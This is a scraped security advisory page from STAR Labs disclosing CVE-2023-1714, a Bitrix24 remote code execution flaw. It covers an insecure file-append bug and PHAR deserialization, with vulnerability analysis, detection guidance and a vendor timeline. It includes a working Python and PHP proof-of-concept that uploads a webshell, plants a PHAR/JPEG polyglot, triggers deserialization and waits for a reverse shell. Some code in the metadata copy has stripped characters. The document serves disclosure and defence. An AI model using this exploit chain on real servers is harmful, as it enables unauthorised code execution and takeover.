'rb').read() def set_progress_data(session, sessid, path): print(f\"[+] Setting fake user options\") session.cookies.set(\"BITRIX_SM_LAST_SETTINGS\", dict_to_str(nested_to_urlencoded([{ \"c\": \"crm\", \"v\": { \"FILE_PATH\": f\"phar://{path}/a\", \"PROCESS_TOKEN\": \"b\", }, \"n\": \"crm_stexport_contact\" }], \"p\" ) | {\"sessid\": sessid})) session.get( HOST + \"/bitrix/tools/public_session.php\", headers={\"X-Bitrix-Csrf-Token\": sessid}, ) def get_upload_params(session, sessid): resp = session.post( HOST + \"/bitrix/components/bitrix/crm.contact.details/ajax.php?sessid=\" + sessid, data={ \"FIELD_NAME\": \"PHOTO\", \"ACTION\": \"RENDER_IMAGE_INPUT\", \"ACTION_ENTITY_ID\": \"0\", }, ) controlUid = re.search( re.compile(\"'controlUid':'([a-f0-9]{32})'\"), resp.text ).group(1) controlSign = re.search( re.compile(\"'controlSign':'([a-f0-9]{64})'\"), resp.text ).group(1) urlUpload = re.search(re.compile(\"'urlUpload':'(.*)'\"), resp.text).group(1) user_id = re.search(re.compile(\"'USER_ID':'([0-9]+)'\"), resp.text).group(1) return controlUid, controlSign, urlUpload, user_id def upload_file(session, sessid, controlUid, controlSign, urlUpload, user_id, data): resp = session.post( HOST + urlUpload, headers={ \"X-Bitrix-Csrf-Token\": sessid, \"X-Bitrix-Site-Id\": SITE_ID, }, data={ \"bxu_files[file167][name]\": \"bitrix-out.jpg\", \"bxu_files[file167][type]\": \"image/jpg\", \"bxu_files[file167][size]\": \"10\", \"AJAX_POST\": \"Y\", \"USER_ID\": user_id, \"sessid\": sessid, \"SITE_ID\": SITE_ID, \"bxu_info[controlId]\": \"bitrixUploader\", \"bxu_info[CID]\": controlUid, \"cid\": controlUid, \"moduleId\": \"crm\", \"allowUpload\": \"I\", \"uploadMaxFilesize\": \"3145728\", \"bxu_info[uploadInputName]\": \"bxu_files\", \"bxu_info[version]\": \"1\", \"bxu_info[mode]\": \"upload\", \"bxu_info[filesCount]\": \"1\", \"bxu_info[packageIndex]\": \"pIndex1\", \"mfi_mode\": \"upload\", \"mfi_sign\": controlSign, }, files={ \"bxu_files[file167][default]\": ( \"bitrix-out.jpg\", data, \"image/jpg\", ) }, proxies=PROXY, ) full_path = list(json.loads(resp.text)[\"files\"].values())[0][\"file\"][\"thumb_src\"] return re.search( re.compile( \"/upload/resize_cache/crm/([a-f0-9]{3}/[a-z0-9]{32})/90_90_2/bitrix-out\\\\.jpg\" ), full_path, ).group(1) def trigger_file_exists(session, sessid): session.post( HOST + \"/bitrix/components/bitrix/crm.contact.list/stexport.ajax.php?sessid=\" + sessid, headers={\"Content-Type\": \"application/x-www-form-urlencoded\"}, data=nested_to_urlencoded({ \"SITE_ID\": SITE_ID, \"ENTITY_TYPE_NAME\": \"CONTACT\", \"EXPORT_TYPE\": \"csv\", \"PROCESS_TOKEN\": \"b\", }, \"PARAMS\") | {\"ACTION\": \"STEXPORT\"} ) if __name__ == \"__main__\": s = requests.Session() s.proxies = PROXY sessid = login(s, USERNAME, PASSWORD) webshell_path = upload_web_shell(s, sessid) ROOT_PATH = webshell_path[:webshell_path.index(\"upload\")] print(f\"[+] Webshell uploaded to '{webshell_path}'\") controlUid, controlSign, urlUpload, user_id = get_upload_params(s, sessid) data = make_phar(webshell_path) path = upload_file(s, sessid, controlUid, controlSign, urlUpload, user_id, data) path = f\"{ROOT_PATH}upload/crm/{path}/bitrix-out.jpg\" print(f\"[+] PHAR uploaded to '{path}'\") set_progress_data(s, sessid, path) print(f\"[+] Triggering file_exists phar deserialization\") threading.Thread(target=trigger_file_exists, args=(s, sessid)).start() print(\"[+] Waiting for reverse shell connection\") subprocess.run([\"nc\", \"-nvlp\", str(PORT)]) The following PHP files also need to be present in the same directory:\ncreate_phar.php:\nphp namespace Bitrix\\Bizproc\\Activity; use Bitrix\\Bizproc\\FieldType; use Bitrix\\Main\\ArgumentException; include(\"./CCloudsDebug.php\"); use CCloudsDebug; class PropertiesDialog { public $activityFile; public $dialogFileName = 'properties_dialog.php'; public $map; public $mapCallback; public $documentType; public $activityName; public $workflowTemplate; public $workflowParameters; public $workflowVariables; public $currentValues; public $formName; public $siteId; public $renderer; public $context; public $runtimeData = array(); public function __toString() { if ($this-renderer !== null) { return call_user_func($this-renderer, $this); } $runtime = \\CBPRuntime::getRuntime(); $runtime-startRuntime(); return (string)$runtime-executeResourceFile( $this-activityFile, $this-dialogFileName, array_merge(array( 'dialog' = $this, //compatible parameters \t'arCurrentValues' = $this-getCurrentValues($this-dialogFileName === 'properties_dialog.php'), 'formName' = $this-getFormName() ), $this-getRuntimeData() ) ); } } $cloudDebug = new CCloudsDebug(); $dialog = new PropertiesDialog(); $dialog-dialogFileName = \"stexport.php\"; $dialog-runtimeData = [\"path\" = [$argv[1], \"\"]]; $cloudDebug-head = $dialog; function generate_base_phar($o){ global $tempname; @unlink($tempname); $phar = new \\Phar($tempname); $phar-startBuffering(); $phar-addFromString(\"test.txt\", \"test\"); $phar-setStub(\"\"); $phar-setMetadata($o); $phar-stopBuffering(); $basecontent = file_get_contents($tempname); @unlink($tempname); return $basecontent; } function generate_polyglot($phar, $jpeg){ $phar = substr($phar, 6); // remove  $len = strlen($phar) + 2; // fixed  $new = substr($jpeg, 0, 2) . \"\\xff\\xfe\" . chr(($len  8) \u0026 0xff) . chr($len \u0026 0xff) . $phar . substr($jpeg, 2); $contents = substr($new, 0, 148) . \" \" . substr($new, 156); // calc tar checksum  $chksum = 0; for ($i=0; $i512; $i++){ $chksum += ord(substr($contents, $i, 1)); } // embed checksum  $oct = sprintf(\"%07o\", $chksum); $contents = substr($contents, 0, 148) . $oct . substr($contents, 155); return $contents; } // config for jpg $tempname = 'temp.tar.phar'; // make it tar $jpeg = file_get_contents('bitrix.jpg'); $outfile = 'test.phar'; $payload = $cloudDebug; // make jpg file_put_contents($outfile, generate_polyglot(generate_base_phar($payload), $jpeg)); CCloudsDebug.php:\nphp class CCloudsDebug { public $head = ''; public $id = ''; } Additionally, the following bitrix.jpg file also needs to be present: Exploit Conditions: This vulnerability can be exploited when the attacker has access to the CRM feature and permission to edit contacts. This level of access may be granted if the user is in the management board group.\nDetection Guidance: It is possible to detect the exploitation of this vulnerability by scanning the file system to detect the presence of phar files, which contain the string __HALT_COMPILER();. Alternatively, the traffic logs can be examined to check if any of the BITRIX_SM_LAST_SETTINGS cookies sent to the server contain the string phar://.\nCredits Lam Jun Rong \u0026 Li Jiantao of STAR Labs SG Pte. Ltd. (@starlabs_sg)\nTimeline  2023-03-17 Initial Vendor Contact via https://www.bitrix24.com/report/ 2023-03-18 No reply from vendor, tried using the form again 2023-03-21 Email to info@bitrix.com 2023-03-21 Email to info@1c-bitrix.ru 2023-03-24 Got reply from info@1c-bitrix.ru, they asked us to email to info@bitrix.com or use the form at https://www.bitrix24.com/report/ with regards to the bug reports 2023-03-29 Emailed to [redacted], [redacted] \u0026 [redacted]. Team member found the 3 email addresses via an [USA bug bounty platform] 2023-03-30 [redacted] replied to us 2023-03-31 [redacted] wanted us to report the bugs via that [USA bug bounty platform] 2023-03-31 Emailed back to [redacted] that we are unable to do so because it’s a private program in that [USA bug bounty platform] 2023-03-31 [redacted] emailed back with the invite 2023-03-31 Submitted the reports via that [USA bug bounty platform] 2023-03-31 Informed [redacted] again that we are unable to report all the bugs due to [blah blah blah Requirements] 2023-04-03 [redacted] replied that they had remove the [blah blah blah Requirements] limitations for us 2023-04-04 We submitted the final 2 reports 2023-06-21 [redacted] emailed us “Generally, we prefer not to publish CVE, because our clients tend to postpone or skip even critical updates, and hackers definitely will be using this information for attacking our clients. It have happened several times in the past, with huge consequences for our company and for our clients. To tell the truth, I would like to set award on [USA bug bounty platform] instead of CVE publishing. Please let me know what do you think about that.” 2023-06-23 Emailed back to Bitrix that we prefer to publish the CVE and do not want the reward. We are also willing to delay the publication at a mutually agreed date. 2023-09-22 [redacted] finally replied asking us if we are agreeable to publish the CVE in November 2023 2023-09-22 Emailed back that we are agreeable to delay the publication to 1st November 2023 2023-09-22 [redacted] accepted the date 2023-11-01 Public Release  ",
  "wordCount" : "4237",
  "inLanguage": "en",
  "datePublished": "2023-11-01T00:00:00Z",
  "dateModified": "2023-11-01T00:00:00Z",
  "author":{
    "@type": "Person",
    "name": "Lam Jun Rong \u0026 Li Jiantao (@CurseRed)"
  },
  "mainEntityOfPage": {
    "@type": "WebPage",
    "@id": "https://starlabs.sg/advisories/23/23-1714/"
  },
  "publisher": {
    "@type": "Organization",
    "name": "STAR Labs",
    "logo": {
      "@type": "ImageObject",
      "url": "https://starlabs.sg/logo-white.png"
    }
  }
}
</script>
</head>

<body class=" dark" id="top">

<header class="header">
    <nav class="nav">
        <div class="logo">
            <a href="https://starlabs.sg/" accesskey="h" title="  (Alt + H)">
                <img src="https://starlabs.sg/logo-white.png" alt="logo" aria-label="logo"
                    height="35"> </a>
            <span class="logo-switches">
            </span>
        </div>
        <ul id="menu">
            <li>
                <a href="https://starlabs.sg/" title="Home">
                    <span>Home</span>
                </a>
            </li>
            <li>
                <a href="https://starlabs.sg/about/" title="About">
                    <span>About</span>
                </a>
            </li>
            <li>
                <a href="https://starlabs.sg/advisories/" title="Advisories">
                    <span>Advisories</span>
                </a>
            </li>
            <li>
                <a href="https://starlabs.sg/blog/" title="Blog">
                    <span>Blog</span>
                </a>
            </li>
            <li>
                <a href="https://starlabs.sg/achievements/" title="Achievements">
                    <span>Achievements</span>
                </a>
            </li>
            <li>
                <a href="https://starlabs.sg/publications/" title="Publications">
                    <span>Publications</span>
                </a>
            </li>
            <li>
                <a href="https://starlabs.sg/search/" title="Search (Alt &#43; /)" accesskey=/>
                    <span>Search</span>
                </a>
            </li>
        </ul>
    </nav>
</header>
<main class="main">

<article class="post-single">
  <header class="post-header">
    <div class="breadcrumbs"><a href="https://starlabs.sg/">Home</a>&nbsp;»&nbsp;<a href="https://starlabs.sg/advisories/">Advisories</a></div>
    <h1 class="post-title">
      (CVE-2023-1714) Bitrix24 Remote Command Execution (RCE) via Unsafe Variable Extraction
    </h1>
    <div class="post-meta"><span title='2023-11-01 00:00:00 +0000 UTC'>November 1, 2023</span>&nbsp;·&nbsp;20 min&nbsp;·&nbsp;Lam Jun Rong &amp; Li Jiantao (@CurseRed)

</div>
  </header> <div class="toc">
    <details >
        <summary accesskey="c" title="(Alt + C)">
            <span class="details">Table of Contents</span>
        </summary>

        <div class="inner"><ul>
                <li>
                    <a href="#summary" aria-label="Summary:">Summary:</a></li>
                <li>
                    <a href="#1-rce-via-appending-arbitrary-content-to-existing-php-files" aria-label="1. RCE via appending arbitrary content to existing PHP files">1. RCE via appending arbitrary content to existing PHP files</a><ul>
                        
                <li>
                    <a href="#cvss31-scoring-system" aria-label="CVSS3.1 Scoring System:">CVSS3.1 Scoring System:</a></li>
                <li>
                    <a href="#vulnerability-details" aria-label="Vulnerability Details:">Vulnerability Details:</a><ul>
                        
                <li>
                    <a href="#attacker-controlled-user-options" aria-label="Attacker-controlled User Options">Attacker-controlled User Options</a></li></ul>
                </li>
                <li>
                    <a href="#proof-of-concept" aria-label="Proof-of-Concept:">Proof-of-Concept:</a></li>
                <li>
                    <a href="#exploit-conditions" aria-label="Exploit Conditions:">Exploit Conditions:</a></li>
                <li>
                    <a href="#detection-guidance" aria-label="Detection Guidance:">Detection Guidance:</a></li></ul>
                </li>
                <li>
                    <a href="#2-rce-via-phar-deserialization" aria-label="2. RCE via PHAR deserialization">2. RCE via PHAR deserialization</a><ul>
                        
                <li>
                    <a href="#cvss31-scoring-system-1" aria-label="CVSS3.1 Scoring System:">CVSS3.1 Scoring System:</a></li>
                <li>
                    <a href="#vulnerability-details-1" aria-label="Vulnerability Details:">Vulnerability Details:</a><ul>
                        
                <li>
                    <a href="#attacker-controlled-user-options-1" aria-label="Attacker-controlled User Options">Attacker-controlled User Options</a></li></ul>
                </li>
                <li>
                    <a href="#proof-of-concept-1" aria-label="Proof-of-Concept:">Proof-of-Concept:</a></li>
                <li>
                    <a href="#exploit-conditions-1" aria-label="Exploit Conditions:">Exploit Conditions:</a></li>
                <li>
                    <a href="#detection-guidance-1" aria-label="Detection Guidance:">Detection Guidance:</a></li></ul>
                </li>
                <li>
                    <a href="#credits" aria-label="Credits">Credits</a></li>
                <li>
                    <a href="#timeline" aria-label="Timeline">Timeline</a>
                </li>
            </ul>
        </div>
    </details>
</div>

  <div class="post-content"><h2 id="summary">Summary:<a hidden class="anchor" aria-hidden="true" href="#summary">#</a></h2>
<table>
<thead>
<tr>
<th><strong>Product</strong></th>
<th>Bitrix24</th>
</tr>
</thead>
<tbody>
<tr>
<td><strong>Vendor</strong></td>
<td>Bitrix24</td>
</tr>
<tr>
<td><strong>Severity</strong></td>
<td>High</td>
</tr>
<tr>
<td><strong>Affected Versions</strong></td>
<td>Bitrix24 22.0.300 (latest version as of writing)</td>
</tr>
<tr>
<td><strong>Tested Versions</strong></td>
<td>Bitrix24 22.0.300 (latest version as of writing)</td>
</tr>
<tr>
<td><strong>CVE Identifier</strong></td>
<td>CVE-2023-1714</td>
</tr>
<tr>
<td><strong>CVE Description</strong></td>
<td>Unsafe variable extraction in bitrix/modules/main/classes/general/user_options.php in Bitrix24 22.0.300 allows remote authenticated attackers to execute arbitrary code via (1) appending arbitrary content to existing PHP files or (2) PHAR deserialization.</td>
</tr>
<tr>
<td><strong>CWE Classification(s)</strong></td>
<td>CWE-73 External Control of File Name or Path; CWE-502 Deserialization of Untrusted Data</td>
</tr>
<tr>
<td><strong>CAPEC Classification(s)</strong></td>
<td>CAPEC-549 Local Execution of Code</td>
</tr>
</tbody>
</table>
<h2 id="1-rce-via-appending-arbitrary-content-to-existing-php-files">1. RCE via appending arbitrary content to existing PHP files<a hidden class="anchor" aria-hidden="true" href="#1-rce-via-appending-arbitrary-content-to-existing-php-files">#</a></h2>
<h3 id="cvss31-scoring-system">CVSS3.1 Scoring System:<a hidden class="anchor" aria-hidden="true" href="#cvss31-scoring-system">#</a></h3>
<p><strong>Base Score:</strong> 8.8 (High)
<strong>Vector String:</strong> <code>CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H</code></p>
<table>
<thead>
<tr>
<th><strong>Metric</strong></th>
<th><strong>Value</strong></th>
</tr>
</thead>
<tbody>
<tr>
<td><strong>Attack Vector (AV)</strong></td>
<td>Network</td>
</tr>
<tr>
<td><strong>Attack Complexity (AC)</strong></td>
<td>Low</td>
</tr>
<tr>
<td><strong>Privileges Required (PR)</strong></td>
<td>Low</td>
</tr>
<tr>
<td><strong>User Interaction (UI)</strong></td>
<td>None</td>
</tr>
<tr>
<td><strong>Scope (S)</strong></td>
<td>Unchanged</td>
</tr>
<tr>
<td><strong>Confidentiality (C)</strong></td>
<td>High</td>
</tr>
<tr>
<td><strong>Integrity (I)</strong></td>
<td>High</td>
</tr>
<tr>
<td><strong>Availability (A)</strong></td>
<td>High</td>
</tr>
</tbody>
</table>
<h3 id="vulnerability-details">Vulnerability Details:<a hidden class="anchor" aria-hidden="true" href="#vulnerability-details">#</a></h3>
<p>This report presents information on an insecure file append vulnerability in Bitrix24 which allows an adversary to run arbitrary commands on the affected web server.</p>
<p>It was discovered that the <code>init</code> function of the <code>Export</code> controller located at <code>bitrix/modules/main/lib/controller/export.php</code> allows an attacker to control several properties within the <code>Export</code> class, including the <code>filePath</code> property. This stems from the incorrect assumption that the value returned from <code>CUserOptions::GetOption</code> cannot be controlled by an attacker.</p>
<p>The <code>filePath</code> property is used by the <code>exportAction</code> function to determine the file where attacker controlled exported data should be written to. Thus, by controlling this property, an attacker can append nearly arbitrary data to any file, including PHP files, and thus achieveing remote code execution.</p>
<p>The <code>Export</code> controller is subclassed by several other controllers, each responsible for exporting entities related to its own module. For this report, we will focus on the crm export controller located at <code>bitrix/modules/crm/lib/controller/export.php</code>, though the vulnerability is present in any class that extends <code>Bitrix\Main\Controller\Export</code>.</p>
<p>The <code>Bitrix\Main\Controller\Export::init</code> function is called when a POST request is made to <code>https://TARGET_HOST/bitrix/services/main/ajax.php?action=bitrix%3Acrm.api.export.export</code>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="c1">// bitrix/modules/main/lib/controller/export.php lines 205 to 220
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
</span></span><span class="line"><span class="cl"><span class="nv">$progressData</span> <span class="o">=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">getProgressParameters</span><span class="p">();</span> <span class="c1">// [1]
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="k">if</span> <span class="p">(</span><span class="nx">count</span><span class="p">(</span><span class="nv">$progressData</span><span class="p">)</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">isNewProcess</span> <span class="o">=</span> <span class="p">(</span><span class="k">empty</span><span class="p">(</span><span class="nv">$progressData</span><span class="p">[</span><span class="s1">&#39;processToken&#39;</span><span class="p">])</span> <span class="o">||</span> <span class="nv">$progressData</span><span class="p">[</span><span class="s1">&#39;processToken&#39;</span><span class="p">]</span> <span class="o">!==</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">processToken</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">isNewProcess</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="c1">// restore state
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="k">foreach</span> <span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">fieldToStoreInProcess</span> <span class="k">as</span> <span class="nv">$fieldName</span><span class="p">)</span> <span class="c1">// [2]
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$progressData</span><span class="p">[</span><span class="nv">$fieldName</span><span class="p">]))</span>
</span></span><span class="line"><span class="cl">            <span class="p">{</span>
</span></span><span class="line"><span class="cl">                <span class="nv">$this</span><span class="o">-&gt;</span><span class="p">{</span><span class="nv">$fieldName</span><span class="p">}</span> <span class="o">=</span> <span class="nv">$progressData</span><span class="p">[</span><span class="nv">$fieldName</span><span class="p">];</span> <span class="c1">// [3]
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>            <span class="p">}</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><p>In <code>[1]</code> the <code>getProgressParameters()</code> function is called to retrieve any progress that has been made since the previous request. This function calls and returns the result of the <code>CUserOptions::GetOption</code>. In the next section, we will examine the <code>getProgressParameters()</code> function in greater detail and show that the return value of this function can be almost completely controlled by an attacker.</p>
<p>Next, if the <code>processToken</code> of the saved progress data matches that sent in the request, control flow enters the loop at <code>[2]</code>. As the <code>$progressData</code> variable is controlled by the attacker, this condition is trivial to satisfy.</p>
<p>For each property whitelisted in the <code>$this-&gt;fieldToStoreInProcess</code> array, if the property also exists in the attacker controlled <code>$progressData</code> variable, the value of the property in the  <code>Bitrix\Main\Controller\Export</code> class will be overwritten by the value in <code>$progressData</code>. As <code>filePath</code> is one of the whitelisted properties, an attacker can thus control the <code>filePath</code> property on the <code>Bitrix\Main\Controller\Export</code> class.</p>
<p>After saved properties are reinitialized, the action handler function, <code>exportAction</code> is called:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="k">public</span> <span class="k">function</span> <span class="nf">exportAction</span><span class="p">(){</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="c1">// initalize properties if not already set by init()
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
</span></span><span class="line"><span class="cl">    <span class="c1">// line 454
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="nx">ob_start</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$componentResult</span> <span class="o">=</span> <span class="nv">$APPLICATION</span><span class="o">-&gt;</span><span class="na">IncludeComponent</span><span class="p">(</span>  <span class="c1">// [4]
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">componentName</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">        <span class="s1">&#39;&#39;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$componentParameters</span>
</span></span><span class="line"><span class="cl">    <span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$exportData</span> <span class="o">=</span> <span class="nx">ob_get_contents</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">    <span class="nx">ob_end_clean</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="nv">$processedItemsOnStep</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="nx">is_array</span><span class="p">(</span><span class="nv">$componentResult</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">    <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="c1">// set $processedItemsOnStep to the number of items exported
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">totalItems</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="k">break</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="nv">$processedItemsOnStep</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">processedItems</span> <span class="o">+=</span> <span class="nv">$processedItemsOnStep</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">writeTempFile</span><span class="p">(</span><span class="nv">$exportData</span><span class="p">,</span> <span class="p">(</span><span class="nv">$nextPage</span> <span class="o">===</span> <span class="mi">1</span><span class="p">));</span> <span class="c1">// [5]
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="nx">unset</span><span class="p">(</span><span class="nv">$exportData</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">isExportCompleted</span> <span class="o">=</span> <span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">processedItems</span> <span class="o">&gt;=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">totalItems</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">isExportCompleted</span> <span class="o">&amp;&amp;</span> <span class="o">!</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">isCloudAvailable</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="c1">// adjust completed file size
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>            <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">fileSize</span> <span class="o">=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">getSizeTempFile</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><p>The <code>exportAction</code> function includes a component based on the <code>COMPONENT_NAME</code> request body parameter. For example, to export crm contacts, the <code>crm.contact.list</code> component is included at <code>[4]</code>. The output of this component is a list of contacts in CSV format stored in the <code>$exportData</code> variable. An attacker can control parts of the exported data by creating contacts with malicious payloads hidden in the <code>SOURCE_DESCRIPTION</code> field.</p>
<p>Next, the <code>writeTempFile</code> function is called to write <code>$exportData</code> to a file:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="c1">// bitrix/modules/main/lib/controller/export.php lines 1296 to 1315
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
</span></span><span class="line"><span class="cl"><span class="k">protected</span> <span class="k">function</span> <span class="nf">writeTempFile</span><span class="p">(</span><span class="nv">$data</span><span class="p">,</span> <span class="nv">$precedeUtf8Bom</span> <span class="o">=</span> <span class="k">true</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$file</span> <span class="o">=</span> <span class="nx">fopen</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">filePath</span><span class="p">,</span> <span class="s1">&#39;ab&#39;</span><span class="p">);</span> <span class="c1">// [6]
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="k">if</span><span class="p">(</span><span class="nx">is_resource</span><span class="p">(</span><span class="nv">$file</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">    <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="c1">// add UTF-8 BOM marker
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="k">if</span> <span class="p">(</span><span class="nx">\Bitrix\Main\Application</span><span class="o">::</span><span class="na">isUtfMode</span><span class="p">()</span> <span class="o">||</span> <span class="nx">defined</span><span class="p">(</span><span class="s1">&#39;BX_UTF&#39;</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">        <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="k">if</span><span class="p">(</span><span class="nv">$precedeUtf8Bom</span> <span class="o">===</span> <span class="k">true</span> <span class="o">&amp;&amp;</span> <span class="p">(</span><span class="nx">filesize</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">filePath</span><span class="p">)</span> <span class="o">===</span> <span class="mi">0</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">            <span class="p">{</span>
</span></span><span class="line"><span class="cl">                <span class="nx">fwrite</span><span class="p">(</span><span class="nv">$file</span><span class="p">,</span> <span class="nx">chr</span><span class="p">(</span><span class="mi">239</span><span class="p">)</span><span class="o">.</span><span class="nx">chr</span><span class="p">(</span><span class="mi">187</span><span class="p">)</span><span class="o">.</span><span class="nx">chr</span><span class="p">(</span><span class="mi">191</span><span class="p">));</span>
</span></span><span class="line"><span class="cl">            <span class="p">}</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">        <span class="nx">fwrite</span><span class="p">(</span><span class="nv">$file</span><span class="p">,</span> <span class="nv">$data</span><span class="p">);</span>  <span class="c1">// [7]
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="nx">fclose</span><span class="p">(</span><span class="nv">$file</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="nx">unset</span><span class="p">(</span><span class="nv">$file</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">fileSize</span> <span class="o">=</span> <span class="nx">filesize</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">filePath</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><p>The file specified by the attacker controlled <code>filePath</code> property is opened in append mode at <code>[6]</code> and the exported data is appended to it at <code>[7]</code>.</p>
<p>Therefore, an attacker can append arbitrary PHP code to a PHP file, resulting in remote command execution.</p>
<h4 id="attacker-controlled-user-options">Attacker-controlled User Options<a hidden class="anchor" aria-hidden="true" href="#attacker-controlled-user-options">#</a></h4>
<p>In this section we will show how an authenticated attacker can alter their own user options, thus controlling the return value of any <code>CUserOptions::GetOption</code> call and eventually the <code>filePath</code> property of the <code>Bitrix\Main\Controller\Export</code> class.</p>
<p>First, we observe that the <code>getProgressParameters()</code> is just a simple wrapper over a <code>CUserOptions::GetOption</code> call at <code>[8]</code>. In the case of exporting CRM contacts, <code>this-&gt;module</code> is <code>'crm'</code> and <code>$this-&gt;getProgressParameterOptionName()</code> is <code>'crm_cloud_export_CONTACT'</code>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="c1">// bitrix/modules/main/lib/controller/export.php lines 1165 to 1174
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
</span></span><span class="line"><span class="cl"><span class="k">protected</span> <span class="k">function</span> <span class="nf">getProgressParameters</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
